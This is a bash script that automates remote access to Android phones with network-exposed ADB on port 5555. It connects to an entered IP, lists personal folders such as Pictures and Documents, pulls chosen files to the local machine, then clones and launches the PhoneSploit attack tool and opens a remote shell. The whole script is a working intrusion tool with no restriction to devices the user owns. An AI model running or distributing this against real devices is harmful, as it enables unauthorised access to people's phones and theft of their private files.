#!/bin/bash

echo "=== Android ADB + PhoneSploit Helper Script ==="

# Check/install adb
if ! command -v adb &> /dev/null; then
  echo "[*] adb not found. Installing..."
  sudo apt-get update && sudo apt-get install adb -y || { echo "Failed to install adb"; exit 1; }
else
  echo "[*] adb is installed."
fi

# Check python3 and git for PhoneSploit
if ! command -v python3 &> /dev/null; then
  echo "[*] python3 not found. Installing..."
  sudo apt-get install python3 python3-pip -y || { echo "Failed to install python3"; exit 1; }
fi
if ! command -v git &> /dev/null; then
  echo "[*] git not found. Installing..."
  sudo apt-get install git -y || { echo "Failed to install git"; exit 1; }
fi

# Prompt for device IP
read -rp "Enter Android device IP (e.g. 192.168.1.10): " DEVICE_IP

echo "[*] Connecting to $DEVICE_IP:5555 ..."
adb connect "$DEVICE_IP:5555"

# Verify connection
if adb devices | grep -q "$DEVICE_IP:5555"; then
  echo "[+] Successfully connected to $DEVICE_IP"
else
  echo "[-] Failed to connect to $DEVICE_IP. Exiting."
  exit 1
fi

# List connected devices
echo "[*] Currently connected devices:"
adb devices -l

# Define common Android directories to scan
COMMON_DIRS=(
  "/sdcard/Download"
  "/sdcard/Documents"
  "/sdcard/Pictures"
  "/sdcard/Music"
  "/sdcard/Movies"
)

echo "[*] Scanning common directories on device..."

for dir in "${COMMON_DIRS[@]}"; do
  echo "----- Listing $dir -----"
  adb -s "$DEVICE_IP:5555" shell "ls -l $dir" || echo "[!] Could not access $dir"
  echo ""
done

# Function to pull files interactively
pull_files() {
  while true; do
    read -rp "Pull a file from device? (y/n): " yn
    case $yn in
      [Yy]* )
        read -rp "Enter full device file path (e.g. /sdcard/Download/secret.txt): " FILE_PATH
        read -rp "Enter local destination directory (e.g. ~/Desktop): " LOCAL_DIR
        mkdir -p "$LOCAL_DIR"
        echo "[*] Pulling $FILE_PATH to $LOCAL_DIR"
        adb -s "$DEVICE_IP:5555" pull "$FILE_PATH" "$LOCAL_DIR" && echo "[+] File pulled successfully." || echo "[-] Failed to pull file."
        ;;
      [Nn]* ) break ;;
      * ) echo "Please answer y or n." ;;
    esac
  done
}

# Run the file pulling function
pull_files

# Setup and run PhoneSploit
echo "[*] Setting up PhoneSploit..."

if [ ! -d "PhoneSploit" ]; then
  echo "[*] Cloning PhoneSploit repository..."
  git clone https://github.com/aerosol-can/PhoneSploit.git || { echo "Failed to clone PhoneSploit repo"; exit 1; }
fi

cd PhoneSploit || { echo "Failed to enter PhoneSploit directory"; exit 1; }

# Install required Python packages
echo "[*] Installing PhoneSploit dependencies..."
pip3 install -r requirements.txt || echo "[!] Some dependencies may have failed to install."

# Launch PhoneSploit shell on device
echo "[*] Launching PhoneSploit shell on device $DEVICE_IP"
python3 phonesploit.py "$DEVICE_IP"

cd ..

# Offer to open direct adb shell
while true; do
  read -rp "Open direct adb shell on device? (y/n): " yn
  case $yn in
    [Yy]* )
      adb -s "$DEVICE_IP:5555" shell
      break
      ;;
    [Nn]* ) break ;;
    * ) echo "Please answer y or n." ;;
  esac
done

echo "=== Script finished ==="
